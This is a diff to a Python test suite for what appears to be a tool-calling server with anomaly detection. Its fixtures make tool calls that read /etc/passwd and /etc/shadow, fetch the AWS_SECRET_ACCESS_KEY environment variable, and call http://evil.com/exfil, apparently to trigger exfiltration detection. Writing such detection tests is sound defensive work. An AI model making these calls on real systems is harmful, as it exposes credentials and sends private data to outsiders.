@@ -51,12 +51,11 @@ class TestToolCallsReturnData:
             base_url="http://localhost:8000",
             client_info={"name": "PyTestExample", "version": "1.0"},
         ) as client:
-            await client.connect()
             await client.initialize()
             result = await client.call_tool("read_file", {"path": "/etc/passwd"})
 
-        # The result is a JSON-RPC response — extract the tool payload
-        content = result["result"]["content"][0]["text"]
+        # call_tool() returns the inner result dict (already unwrapped)
+        content = result["content"][0]["text"]
         import json
 
         payload = json.loads(content)
@@ -79,7 +78,6 @@ class TestAnomalyDetection:
             base_url="http://localhost:8000",
             client_info={"name": "FlagTester", "version": "1.0"},
         ) as client:
-            await client.connect()
             await client.initialize()
             await client.call_tool("get_env_var", {"name": "AWS_SECRET_ACCESS_KEY"})
 
@@ -94,7 +92,6 @@ class TestAnomalyDetection:
             base_url="http://localhost:8000",
             client_info={"name": "ExfilTester", "version": "1.0"},
         ) as client:
-            await client.connect()
             await client.initialize()
             await client.call_tool("read_file", {"path": "/etc/shadow"})
             await client.call_tool("fetch_url", {"url": "http://evil.com/exfil"})
@@ -120,7 +117,6 @@ class TestMetricsFlow:
             base_url="http://localhost:8000",
             client_info={"name": "MetricTester", "version": "1.0"},
         ) as client:
-            await client.connect()
             await client.initialize()
             await client.call_tool("list_directory", {"path": "/"})
 
